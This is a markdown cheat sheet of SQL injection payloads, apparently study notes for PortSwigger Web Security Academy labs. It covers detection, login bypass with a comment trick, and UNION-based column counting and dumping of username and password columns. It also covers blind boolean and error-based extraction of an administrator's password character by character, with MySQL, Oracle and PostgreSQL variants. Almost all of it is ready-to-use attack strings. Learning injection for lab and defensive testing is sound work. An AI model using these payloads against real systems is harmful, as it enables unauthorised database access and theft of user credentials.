# SQL Injection

[**Cheat Sheet**](https://portswigger.net/web-security/sql-injection/cheat-sheet)

**Warning**
Be careful with `OR 1=1` - It's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.

## Detection

- `'` check for errors and anomalies
- `-- ` after first argument, does second argument get ignored (mysql requires a space after `--`)
- Time delay conditions
- OAST (Out-of-band Application Security Testing); trigger an out-of-band network interaction (DNS lookup, HTTP request, or other callback) to a server the tester controls.

## Login Bypass

- `administrator'--` commenet out password

## UNION based SQLi

### Determine number of columns

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

or

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Tip** Oracle requires a FROM keyword with every SELECT clause.
```sql
' UNION SELECT NULL FROM DUAL--
```

### Finding useful columns

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Retrieving data with UNION based SQLi

- For Muliple available useable columns
```sql
' UNION SELECT username, password,Null FROM users--
```
- For multiple values in the same column
```sql
' UNION SELECT username || '~' || password FROM users--
```

### Database Enumeration

- `' UNION SELECT @@version--` for database version
- `SELECT * FROM information_schema.tables` for available tables
- `SELECT * FROM information_schema.columns WHERE table_name = 'Users'` for columns in a database


## BLIND Based 

### Detection

- Look for differences in error messages (or lack of) when appending TRUE/FALSE conditions
```sql
' AND '1'='1
' AND '1'='2
```

### Exploiting


- `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a` - to calculate length
- Test for a specific char
```sql
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) < 'm
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm
```

## Error based

### Detection

- Check for different error messages when syntax is correct `''` vs not `'`
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a -- Returns 1/0
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a -- Returns True (a=a)
```

### Exploiting

- FROM > CONDITION > SELECT
- mysql:
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
- oracle:
```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- get password length
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- get char
```

## ERROR based

- `CAST((SELECT example_column FROM example_table) AS int)` cast as string as int to cause string value to be displayed in the error message
- `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` char limited query to show username of first entry
- `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` same but for password
- `TrackingId=4yb0YyXSCJI1ZdsO'||(select password::int from users)--` even more efficient version


